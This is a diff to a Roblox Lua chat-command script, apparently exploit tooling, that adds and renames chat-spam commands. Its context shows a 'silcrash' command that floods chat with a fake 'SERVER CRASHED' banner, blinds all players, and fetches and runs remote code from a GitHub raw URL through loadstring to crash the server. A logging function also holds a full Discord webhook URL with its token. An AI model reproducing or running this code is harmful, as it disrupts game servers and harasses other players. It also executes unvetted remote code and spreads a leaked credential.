@@ -37,7 +37,8 @@ padbanned = {}
 scriptbanned = {}
 banned = {}
 whitelisted = {game.Players.LocalPlayer.name}
-
+local spamming = false
+local Wspamming = "nothing"
 
 local function sendlog(player, msg)
   local Webhook = "https://discord.com/api/webhooks/935964465881575474/9bvow77BH8qNOWEEBHOKJHZVMGt-Rzb7rnHWsFVkGAEX9CZiBFAuzKkPgUw07EsBMOaXe1L9tb6ef"
@@ -1165,7 +1166,6 @@ LOVE GOD😊💗💗💞💕❣️💕💗🩷💛💚
 
 
 
-
 if string.sub(msg, 1, 6) == "-house" then
 if string.sub(msg, 8, 9) == "me" or string.sub(msg, 8, 8) == "" then
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-23.4106693, 8.22999954, 63.2581749))
@@ -1186,13 +1186,16 @@ end
 end
 end
 if msg == prefix.."silcrash" then
-game.Players:Chat("-loveg")
 game.Players:Chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n SERVER CRASHED \n\n\n\n ________________________________________________")
 game.Players:Chat("blind all")
 wait(0.25)
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/scv3-var's%20usilcrash"),true))()
 end
 
+	if string.sub(msg:lower(), 0, 6) == prefix.."spam " then
+		Wspamming = string.sub(msg:lower(), 7)
+		spamming = true
+	end
 
 
 
@@ -1464,7 +1467,7 @@ if string.sub(msg:lower(), 0, 7) == prefix.."super " then
       Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCF
     end
   end
-  if string.sub(msg:lower(), 1, 6):lower() == prefix.."spam " then
+  if string.sub(msg:lower(), 1, 6):lower() == prefix.."2spam " then
     spamming = true
     local strglower = string.gsub(msg:lower(), "me", player.name)
     wspamming = string.sub(strglower, 7, strglower:len())
@@ -1697,6 +1700,5 @@ game.Players:Chat(prefix.."antikill on")
 game.Players:Chat(prefix.."antikill")
 wait(1)
 game.Players:Chat("-super -loveg")
-
 
 
